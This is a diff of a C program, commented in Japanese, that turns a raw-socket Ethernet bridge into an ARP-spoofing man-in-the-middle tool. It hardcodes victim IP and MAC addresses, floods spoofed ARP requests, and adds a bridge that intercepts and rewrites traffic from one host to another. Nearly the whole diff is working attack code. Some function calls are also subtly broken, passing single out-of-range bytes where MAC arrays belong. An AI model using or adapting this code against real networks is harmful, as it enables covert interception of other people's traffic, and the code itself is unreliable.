@@ -10,6 +10,7 @@
 #include	<netinet/if_ether.h>
 #include    <sys/ioctl.h>
 #include    <linux/if.h>
+#include    <netinet/ip.h>
 #include	"netutil.h"
 
 
@@ -18,9 +19,12 @@ typedef struct	{
     char	*Device1;
     char	*Device2;
     int	DebugOut;
+    
+    char    *ip_A;
+    char    *ip_B;
 }PARAM;
 //ここは手動で変える必要がある！
-PARAM	Param={"enp0s3","lo",1};
+PARAM	Param={"enp0s3","lo",1, "192.168.1.99", "192.168.1.110"};
 
 typedef struct    {
     int    soc;
@@ -75,6 +79,142 @@ int AnalyzePacket(int deviceNo,u_char *data,int size)
     }
     
     return(0);
+}
+
+//MITMパケットを検出し、IPアドレスとMACアドレスを書き換えとく
+int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_mac[6]){
+    u_char    *ptr;
+    int    lest;
+    struct ether_header    *eh;
+    char    buf[80];
+    int    tno;
+    u_char    hwaddr[6];
+    
+    ptr=data;
+    lest=size;
+    
+    //イーサヘッダの分離
+    if(lest<sizeof(struct ether_header)){
+        DebugPrintf("[%d]:lest(%d)<sizeof(struct ether_header)\n",deviceNo,lest);
+        //そもそも有効なパケットではない
+        return(-1);
+    }
+    eh=(struct ether_header *)ptr;
+    ptr+=sizeof(struct ether_header);
+    lest-=sizeof(struct ether_header);
+    
+    //宛先MACアドレスがこのNICでなかったらそもそも違う
+    if(memcmp(&eh->ether_dhost,Device[deviceNo].hwaddr,6)!=0){
+        DebugPrintf("[%d]:dhost not match %s\n",deviceNo,my_ether_ntoa_r((u_char *)&eh->ether_dhost,buf,sizeof(buf)));
+        //そもそも見なくて良い
+        return(-1);
+    }
+    
+    //判別
+    if(ntohs(eh->ether_type)==ETHERTYPE_ARP){
+        struct ether_arp    *arp;
+        
+        if(lest<sizeof(struct ether_arp)){
+            DebugPrintf("[%d]:lest(%d)<sizeof(struct ether_arp)\n",deviceNo,lest);
+            return(-1);
+        }
+        arp=(struct ether_arp *)ptr;
+        ptr+=sizeof(struct ether_arp);
+        lest-=sizeof(struct ether_arp);
+        
+        //        if(arp->arp_op==htons(ARPOP_REQUEST)){
+        //            DebugPrintf("[%d]recv:ARP REQUEST:%dbytes\n",deviceNo,size);
+        //            Ip2Mac(deviceNo,*(in_addr_t *)arp->arp_spa,arp->arp_sha);
+        //        }
+        //        if(arp->arp_op==htons(ARPOP_REPLY)){
+        //            if(arp->arp_spa == send_ip)
+        //            DebugPrintf("[%d]recv:ARP REPLY:%dbytes\n",deviceNo,size);
+        //            Ip2Mac(deviceNo,*(in_addr_t *)arp->arp_spa,arp->arp_sha);
+        //        }
+        
+        //送信者かつ受信者のIPv4アドレスをチェック
+        if(*(in_addr_t *)arp->arp_spa == send_ip || *(in_addr_t *)arp->arp_tpa == rec_ip){
+            //端末BへのARPパケットだったら、無視する。（フォワーディングしてあげない）
+            DebugPrintf("[%d]recv:MITM ARP PACKET:%dbytes\n",deviceNo,size);
+            return (-1);
+        }
+    }
+    else if(ntohs(eh->ether_type)==ETHERTYPE_IP){
+        //IPv4にしか対応してない
+        struct iphdr    *iphdr;
+        u_char    option[1500];
+        int    optionLen;
+        
+        if(lest<sizeof(struct iphdr)){
+            DebugPrintf("[%d]:lest(%d)<sizeof(struct iphdr)\n",deviceNo,lest);
+            return(-1);
+        }
+        iphdr=(struct iphdr *)ptr;
+        ptr+=sizeof(struct iphdr);
+        lest-=sizeof(struct iphdr);
+        
+        //AからBへの通信のときは、IPアドレスとMACアドレスを入れ替えとく。
+        if(iphdr->saddr == send_ip && iphdr->daddr == rec_ip){
+            DebugPrintf("MITM PACKET\n",deviceNo,lest);
+            int ii=0;
+            //宛先は普通に端末BのMACアドレス
+            for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = rec_mac[ii];
+            //送信元MACアドレスは自分
+            for(ii=0; ii<6; ii++) eh->ether_shost[ii] = Device[deviceNo].hwaddr[ii];
+            //IPアドレスは、送信元が端末A、宛先が端末Bになってるので変える必要はない
+            return(1);
+        }
+    }
+    
+    return(0);
+}
+
+//ARPスプーフィングした後の中間者としてのブリッジ(IPForwardingをオンにしておいた方がいい。)
+int MITMBridge(in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_mac[6]){
+    struct pollfd    targets[2];
+    int    nready,i,size;
+    u_char    buf[2048];
+    
+    targets[0].fd=Device[0].soc;
+    targets[0].events=POLLIN|POLLERR;
+    targets[1].fd=Device[1].soc;
+    targets[1].events=POLLIN|POLLERR;
+    
+    int deviceNo = 0;   //使うネットワークデバイス
+    
+    while(EndFlag==0){
+        switch(nready=poll(targets,2,100)){
+            case    -1:
+                if(errno!=EINTR){
+                    perror("poll");
+                }
+                break;
+            case    0:
+                break;
+            default:
+                
+                if(targets[deviceNo].revents&(POLLIN|POLLERR)){
+                    if((size=read(Device[deviceNo].soc,buf,sizeof(buf)))<=0){
+                        perror("read");
+                    }
+                    else{
+                        //TODO:この辺で、イーサヘッダとIPヘッダを書き換えて、MITMブリッジをする
+                        if(AnalyzePacket(deviceNo,buf,size)!=-1){
+                            //MITMパケットの場合だけ送る
+                            if(proccessMITMPacket(deviceNo, buf, size, send_ip, send_mac[6], rec_ip, rec_mac[6]) ){
+                                if((size=write(Device[deviceNo].soc,buf,size))<=0){
+                                    perror("write");
+                                }
+                            }
+                        }
+                    }
+                    
+                }
+                break;
+        }
+    }
+    
+    return (0);
 }
 
 int Bridge()
@@ -277,37 +417,6 @@ char *my_inet_ntoa_r(struct in_addr *addr,char *buf,socklen_t size)
 
 int main(int argc,char *argv[],char *envp[])
 {
-    //    if((Device[0].soc=InitRawSocket(Param.Device1,1,0))==-1){
-    //        DebugPrintf("InitRawSocket:error:%s\n",Param.Device1);
-    //        return(-1);
-    //    }
-    //    DebugPrintf("%s OK\n",Param.Device1);
-    //
-    //    if((Device[1].soc=InitRawSocket(Param.Device2,1,0))==-1){
-    //        DebugPrintf("InitRawSocket:error:%s\n",Param.Device1);
-    //        return(-1);
-    //    }
-    //    DebugPrintf("%s OK\n",Param.Device2);
-    //
-    //    DisableIpForward();
-    //
-    //    signal(SIGINT,EndSignal);
-    //    signal(SIGTERM,EndSignal);
-    //    signal(SIGQUIT,EndSignal);
-    //
-    //    signal(SIGPIPE,SIG_IGN);
-    //    signal(SIGTTIN,SIG_IGN);
-    //    signal(SIGTTOU,SIG_IGN);
-    //
-    //    DebugPrintf("bridge start\n");
-    //    Bridge();
-    //    DebugPrintf("bridge end\n");
-    //
-    //    close(Device[0].soc);
-    //    close(Device[1].soc);
-    //
-    //    return(0);
-    
     char    buf[80];
     
     //----デバイスセッティング
@@ -351,8 +460,8 @@ int main(int argc,char *argv[],char *envp[])
     DebugPrintf("bridge start\n");
     //---ARPスプーフィング
     static  u_char    bcast[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};    //ブロードキャストMACアドレス
-    char    in_addr_text_sender[100] = "192.168.1.99";            //ARPスプーフィング先A
-    char    in_addr_text_receiver[100] = "192.168.1.110";           //ARPスプーフィング先B (A→Bの通信を横取りする)
+    char    *in_addr_text_sender = Param.ip_A;                     //ARPスプーフィング先A
+    char    *in_addr_text_receiver = Param.ip_B;                   //ARPスプーフィング先B (A→Bの通信を横取りする)
     struct  in_addr    sendIp;
     struct  in_addr    recIp;
     
@@ -367,7 +476,15 @@ int main(int argc,char *argv[],char *envp[])
     for(i=0; i<500; i++){
         SendArpRequestB(Device[0].soc, sendIp.s_addr, bcast, recIp.s_addr, Device[0].hwaddr);
     }
+    
+    //TODO:あとでPARAMSに移動
+    static  u_char    mac_A[6]={0x68,0x05,0xCA,0x06,0xF6,0x7B};   //端末AのMACアドレス
+    static  u_char    mac_B[6]={0xB8,0x27,0xEB,0x4A,0xA3,0x53};   //端末BのMACアドレス
     //---ARPスプーフィングここまで
+    //---ブリッジ
+    MITMBridge(sendIp.s_addr, mac_A, recIp.s_addr, mac_B);
+    //Bridge();
+    //---ブリッジここまで
     DebugPrintf("bridge end\n");
     
     close(Device[0].soc);
